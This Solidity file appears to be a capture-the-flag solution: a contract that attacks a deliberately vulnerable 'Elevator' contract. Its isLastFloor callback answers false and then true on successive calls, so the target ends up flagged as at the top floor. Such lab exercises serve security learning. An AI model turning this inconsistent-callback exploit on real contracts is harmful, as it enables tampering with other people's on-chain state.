//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import './Elevator.sol';

contract ElevatorAttack {
  Elevator targetContract;

  constructor(address _targetAddress) {
    targetContract = Elevator(_targetAddress);
  }

  function isLastFloor(uint256 _floor) external view returns (bool) {
    return targetContract.floor() == _floor;
  }

  function attack() external {
    targetContract.goTo(1);
  }
}
